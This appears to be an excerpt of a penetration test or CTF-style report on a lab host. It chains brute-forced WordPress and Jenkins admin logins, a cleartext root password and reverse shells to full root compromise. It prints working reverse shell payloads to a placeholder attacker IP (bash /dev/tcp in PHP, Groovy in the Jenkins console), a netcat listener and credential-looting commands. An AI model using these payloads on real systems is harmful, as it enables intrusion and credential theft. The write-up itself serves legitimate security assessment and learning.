...
**Report Version:** 5.0 (HackTricks Methodology)

---

## 1. Executive Summary

The security assessment resulted in a **full root system compromise**. The overall risk rating is **CRITICAL**. The attack chain exploited a critical combination of weak credential policies (brute-forced WordPress admin and Jenkins admin) and the catastrophic storage of the **root password in cleartext** on the file system.

Immediate and urgent remediation is required, focusing on implementing strong MFA, secure password vaulting, and strict file permission controls.
...
| **C-02** | Sensitive Data Disclosure (User Credentials) | **CRITICAL** | Improper File Permissions |
...
## 2. Methodology and Technical Steps (HackTricks Alignment)
...
| :--- | :--- | :--- | :--- |
| **Service & Port Scan** | Identify open ports and service versions. | `nmap -sC -sV -A 10.201.35.3` | **Open Ports:** 22 (SSH - OpenSSH 7.6p1) and 80 (HTTP - Apache httpd 2.4.29). |
...
| **H-01 / 5- Pentesting Services** | **Reverse Shell Injection** | *PHP code injected into a writable theme file:* `exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKING_IP/4444 0>&1'")` | Prepared the system for initial code execution. |

---

### 7- Getting Shell

**Goal:** Obtain an interactive command-line session on the compromised host.

| Finding ID | Technique | Command Used | Result and Impact |
| :--- | :--- | :--- | :--- |
| **H-01** | **Listener Setup** | `nc -lvnp 4444` | Confirmed shell connection as user **`www-data`**. |

---

### 11- POST / 11.1 - Looting
...
| **C-02** | **Credential Retrieval** | `cat /opt/wp-save.txt` | Recovered SSH credentials for user **`aubreanna:bubb13guM!@#123`**. |
| **Post-Ex** | **Internal Recon (Hidden Files)** | `cat jenkins.txt` | Discovered internal Jenkins service running at **172.17.0.2:8080**. |
...
| **H-02 / 7- Getting Shell** | **RCE via Script Console** | *Groovy Script executed in Jenkins console:* `r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING_IP/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]); p.waitFor()` | Achieved a shell as the **`jenkins`** user. |
...
| **4. SSH Key-Only Access** | Key-Based Auth | Disable password login for SSH across all user accounts. **Command:** Edit `/etc/ssh/sshd_config`, set `PasswordAuthentication no`, and restart service. |
